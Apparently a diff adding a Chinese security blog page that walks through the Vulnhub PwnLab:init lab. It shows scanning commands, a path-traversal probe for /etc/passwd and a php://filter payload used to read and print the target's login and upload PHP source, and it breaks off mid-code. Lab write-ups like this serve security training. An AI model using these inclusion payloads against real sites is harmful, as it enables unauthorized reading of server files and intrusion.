@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>Vulnhub-18pwnlab_init | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //创建雪花元素
+    function snow() {
+      //获取视窗的宽高
+      var width = window.innerWidth;
+      var height = window.innerHeight;
+  
+      var snow = document.createElement("div");             //创建元素
+  
+      //初始化雪花样式
+      size = Math.random() * 15 + 10;                          //随机生成雪花大小
+      snow.style.width = size + "px";
+      snow.style.height = size + "px";
+      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
+      // snow.style.background = "url(./雪花.png) no-repeat";
+      snow.style.backgroundSize = '100% 100%';
+      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
+      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
+      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
+      snow.style.top = "10px";
+      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
+  
+      //向body添加元素
+      document.body.appendChild(snow);
+  
+      //创建定时器，每30ms雪花下落一次
+      var timer = setInterval(function () {
+        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
+  
+        //当雪花到达底部后清除元素
+        if (parseInt(snow.style.top) >= height) {
+          clearInterval(timer);
+          snow.parentNode.removeChild(snow)
+        }
+      }, 30)
+    }
+  
+    //页面加载完成执行函数
+    window.onload = function play() {
+      //创建定时器，每300ms生成一朵雪花
+      setInterval(function () {
+        snow()
+      }, 300)
+    }
+  </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //蜘蛛网特效
+    !
+    function() {
+        function n(n, e, t) {
+            return n.getAttribute(e) || t
+        }
+        function e(n) {
+            return document.getElementsByTagName(n)
+        }
+        function t() {
+            var t = e("script"),
+            o = t.length,
+            i = t[o - 1];
+            return {
+                l: o,
+                z: n(i, "zIndex", -1),
+                o: n(i, "opacity", .9),   //透明度
+                c: n(i, "color", "255, 102, 153"),   //颜色
+                n: n(i, "count", 99)
+            }
+        }
+        function o() {
+            a = m.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+            c = m.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        }
+        function i() {
+            r.clearRect(0, 0, a, c);
+            var n, e, t, o, m, l;
+            s.forEach(function(i, x) {
+                for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 : 1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1, 1), e = x + 1; e < u.length; e++) n = u[e],
+                null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l = o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o, i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t / 2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y), r.lineTo(n.x, n.y), r.stroke()))
+            }),
+            x(i)
+        }
+        var a, c, u, m = document.createElement("canvas"),
+        d = t(),
+        l = "c_n" + d.l,
+        r = m.getContext("2d"),
+        x = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
+        function(n) {
+            window.setTimeout(n, 1e3 / 45)
+        },
+        w = Math.random,
+        y = {
+            x: null,
+            y: null,
+            max: 2e4
+        };
+        m.id = l,
+        m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z + ";opacity:" + d.o,
+        e("body")[0].appendChild(m),
+        o(),
+        window.onresize = o,
+        window.onmousemove = function(n) {
+            n = n || window.event,
+            y.x = n.clientX,
+            y.y = n.clientY
+        },
+        window.onmouseout = function() {
+            y.x = null,
+            y.y = null
+        };
+        for (var s = [], f = 0; d.n > f; f++) {
+            var h = w() * a,
+            g = w() * c,
+            v = 2 * w() - 1,
+            p = 2 * w() - 1;
+            s.push({
+                x: h,
+                y: g,
+                xa: v,
+                ya: p,
+                max: 6e3
+            })
+        }
+        u = s.concat([y]),
+        setTimeout(function() {
+            i()
+        },
+        100)
+    } ();
+
+    //蜘蛛网特效
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Vulnhub-18pwnlab_init</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">G00d</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 23, 2024&nbsp;&nbsp;14:56:12</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="../categories/Vulnhub/">Vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="Vulnhub-18pwnlab-init"><a href="#Vulnhub-18pwnlab-init" class="headerlink" title="Vulnhub-18pwnlab_init"></a>Vulnhub-18pwnlab_init</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">arp</span>-scan -l          nmap --min-rate <span class="number">100000</span> -p- <span class="number">192.168.111.141</span>     nmap --min-rate <span class="number">100000</span> -p80,<span class="number">111</span>,<span class="number">3306</span>,<span class="number">42637</span> -A <span class="number">192.168.111.141</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">dirsearch</span> -u <span class="number">192.168.111.141</span>   dirb  http://<span class="number">192.168.111.141</span>/      nikto -host <span class="number">192.168.111.141</span> -p <span class="number">80</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-18pwnlab-init//image-20241123150003733.png" alt="image-20241123150003733"></p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在网络通信中，端口号的范围从 <span class="strong">**0 到 65535**</span>，其中：</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span><span class="strong">**0 到 1023**</span> 是 <span class="strong">**知名端口**</span>，用于标准服务（如 HTTP 使用 80 端口，HTTPS 使用 443 端口等）。</span><br><span class="line"><span class="bullet">- </span><span class="strong">**1024 到 49151**</span> 是 <span class="strong">**注册端口**</span>，通常由应用程序或协议注册使用。</span><br><span class="line"><span class="bullet">- </span><span class="strong">**49152 到 65535**</span> 是 <span class="strong">**动态或私有端口**</span>，这些端口一般由操作系统动态分配，用于客户端与服务器之间的临时通信。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="在80端口下有"><a href="#在80端口下有" class="headerlink" title="在80端口下有"></a>在80端口下有</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.111.141/images/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.111.141/upload/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.111.141/config.php/ //这个是空的，但是肯定存在这个文件</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.111.141/login.php/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.111.141/upload.php/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.111.141/?page=login</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.111.141/?page=upload</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.111.141 [200 OK] Apache[2.4.10], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.10 (Debian)], IP[192.168.111.141], Title[PwnLab Intranet Image Hosting]  </span></span><br><span class="line">Apache/<span class="number">2.4</span><span class="number">.10</span> (Debian)： multiple<span class="keyword">/webapps/</span><span class="number">51193.</span>py   windows<span class="keyword">/dos/</span><span class="number">9.</span>c</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="在111端口下有"><a href="#在111端口下有" class="headerlink" title="在111端口下有"></a>在111端口下有</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attribute">linux</span>/dos/<span class="number">26887</span>.rb  linux/dos/<span class="number">41974</span>.rb   unix/dos/<span class="number">20376</span>.txt  但是不一定能利用</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="在3306端口暂未发现什么"><a href="#在3306端口暂未发现什么" class="headerlink" title="在3306端口暂未发现什么"></a>在3306端口暂未发现什么</h3><h3 id="42637端口"><a href="#42637端口" class="headerlink" title="42637端口"></a>42637端口</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这个端口应该是和<span class="number">111</span>端口一起用的</span><br><span class="line"></span><br><span class="line"><span class="number">111</span>端口通常用于 Portmap 服务，也叫做 rpcbind，它是一个网络服务，通常运行在 UNIX/Linux 系统中。Portmap 服务的作用是将远程过程调用（RPC）协议的请求映射到对应的本地服务上，使得远程机器可以通过网络访问本机提供的各种服务。</span><br><span class="line"></span><br><span class="line">具体来说，<span class="number">111</span>端口用于：</span><br><span class="line"></span><br><span class="line">RPC绑定：它帮助系统管理 RPC 服务的端口映射。RPC 协议被广泛应用于文件系统（如 NFS）、打印服务、邮件服务等分布式应用程序中。Portmap 会维护一个映射表，记录各个 RPC 服务所占用的端口号，客户端可以通过这个映射表来找到相应服务的端口。</span><br><span class="line"></span><br><span class="line">NFS (Network <span class="keyword">File</span> <span class="keyword">System</span>)：NFS 是一个文件共享协议，它依赖 RPC 协议来实现远程文件系统的访问。Portmap 通过 <span class="number">111</span> 端口提供服务，使得客户端能够访问 NFS 服务。</span><br><span class="line"></span><br><span class="line">需要注意的是，<span class="number">111</span>端口通常不需要对外开放，因此为了安全起见，很多服务器会采取措施关闭此端口，避免潜在的安全风险。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><h3 id="1-伪协议获取源码"><a href="#1-伪协议获取源码" class="headerlink" title="1.伪协议获取源码"></a>1.伪协议获取源码</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">111.141</span>/?page=login 这里存在文件包含漏洞</span><br><span class="line">我在这里尝试了 http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">111.141</span><span class="regexp">/?page=../</span>..<span class="regexp">/../</span>etc<span class="regexp">/passwd   http:/</span><span class="regexp">/192.168.111.141/</span>?page=..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/etc/</span>passwd</span><br><span class="line">也尝试了一下php伪协议  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http:<span class="comment">//192.168.111.141/?page=php://filter/read=convert.base64-encode/resource=login 读到login.php的代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;config.php&quot;</span>);  <span class="comment">//这里我看到配置文件了</span></span><br><span class="line"><span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$server</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"> <span class="variable">$luser</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"> <span class="variable">$lpass</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">​ <span class="variable">$stmt</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE user=? AND pass=?&quot;</span>);</span><br><span class="line">​ <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&#x27;ss&#x27;</span>, <span class="variable">$luser</span>, <span class="variable">$lpass</span>);</span><br><span class="line"></span><br><span class="line">​ <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">​ <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_Result</span>();</span><br><span class="line"></span><br><span class="line">​ <span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;num_rows == <span class="number">1</span>)</span><br><span class="line">​ &#123;</span><br><span class="line">​  <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$luser</span>;</span><br><span class="line">​  <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ?page=upload&#x27;</span>);</span><br><span class="line">​ &#125;</span><br><span class="line">​ <span class="keyword">else</span></span><br><span class="line">​ &#123;</span><br><span class="line">​  <span class="keyword">echo</span> <span class="string">&quot;Login failed.&quot;</span>;</span><br><span class="line">​ &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">​ <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"> &lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line"> &lt;label&gt;Username: &lt;/label&gt;&lt;input id=<span class="string">&quot;user&quot;</span> type=<span class="string">&quot;test&quot;</span> name=<span class="string">&quot;user&quot;</span>&gt;&lt;br /&gt;</span><br><span class="line"> &lt;label&gt;Password: &lt;/label&gt;&lt;input id=<span class="string">&quot;pass&quot;</span> type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;pass&quot;</span>&gt;&lt;br /&gt;</span><br><span class="line"> &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Login&quot;</span>&gt;</span><br><span class="line"> &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">​ <span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">http://192.168.111.141/?page=php://filter/read=convert.base64-encode/resource=upload 读到upload.php的代码</span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">session_start</span>();</span></span><br><span class="line"><span class="language-php"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])) &#123; <span class="keyword">die</span>(<span class="string">&#x27;You must be log in.&#x27;</span>); &#125;</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">method</span>=<span class="string">&#x27;post&#x27;</span> <span class="attr">enctype</span>=<span class="string">&#x27;multipart/form-data&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;file&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;file&#x27;</span> <span class="attr">id</span>=<span class="string">&#x27;file&#x27;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;submit&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;submit&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;Upload&#x27;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="language-php"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span></span><br><span class="line"><span class="language-php"> <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] &lt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-php">  <span class="variable">$filename</span>  = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span></span><br><span class="line"><span class="language-php">  <span class="variable">$filetype</span>  = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span></span><br><span class="line"><span class="language-php">  <span class="variable">$uploaddir</span> = <span class="string">&#x27;upload/&#x27;</span>;</span></span><br><span class="line"><span class="language-php">  <span class="variable">$file_ext</span>  = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>, <span class="string">&#x27;.&#x27;</span>);</span></span><br><span class="line"><span class="language-php">  <span class="variable">$imageinfo</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span></span><br><span class="line"><span class="language-php">  <span class="variable">$whitelist</span> = <span class="keyword">array</span>(<span class="string">&quot;.jpg&quot;</span>,<span class="string">&quot;.jpeg&quot;</span>,<span class="string">&quot;.gif&quot;</span>,<span class="string">&quot;.png&quot;</span>); </span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">  <span class="keyword">if</span> (!(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$whitelist</span>))) &#123;</span></span><br><span class="line"><span class="language-php">   <span class="keyword">die</span>(<span class="string">&#x27;Not allowed extension, please upload images only.&#x27;</span>);</span></span><br><span class="line"><span class="language-php">  &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">  <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$filetype</span>,<span class="string">&#x27;image&#x27;</span>) === <span class="literal">false</span>) &#123;</span></span><br><span class="line"><span class="language-php">   <span class="keyword">die</span>(<span class="string">&#x27;Error 001&#x27;</span>);</span></span><br><span class="line"><span class="language-php">  &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">  <span class="keyword">if</span>(<span class="variable">$imageinfo</span>[<span class="string">&#x27;mime&#x27;</span>] != <span class="string">&#x27;image/gif&#x27;</span> &amp;&amp; <span class="variable">$imageinfo</span>[<span class="string">&#x27;mime&#x27;</span>] != <span class="string">&#x27;image/jpeg&#x27;</span> &amp;&amp; <span class="variable">$imageinfo</span>[<span class="string">&#x27;mime&#x27;</span>] != <span class="string">&#x27;image/jpg&#x27;</span>&amp;&amp; <span class="variable">$imageinfo</span>[<span class="string">&#x27;mime&#x27;</span>] != <span class="string">&#x27;image/png&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-php">   <span class="keyword">die</span>(<span class="string">&#x27;Error 002&#x27;</span>);</span></span><br><span class="line"><span class="language-php">  &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">  <span class="keyword">if</span>(<span class="title function_ invoke__">substr_count</span>(<span class="variable">$filetype</span>, <span class="string">&#x27;/&#x27;</span>)&gt;<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="language-php">   <span class="keyword">die</span>(<span class="string">&#x27;Error 003&#x27;</span>);</span></span><br><span class="line"><span class="language-php">  &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">  <span class="variable">$uploadfile</span> = <span class="variable">$uploaddir</span> . <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])).<span class="variable">$file_ext</span>;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">  <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$uploadfile</span>)) &#123;</span></span><br><span class="line"><span class="language-php">   <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$uploadfile</span>.<span class="string">&quot;\&quot;&gt;&lt;br /&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">  &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-php">   <span class="keyword">die</span>(<span class="string">&#x27;Error 4&#x27;</span>);</span></span><br><span class="line"><span class="language-php">  &#125;</span></span><br><span class="line"><span class="language-php"> &#125;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span 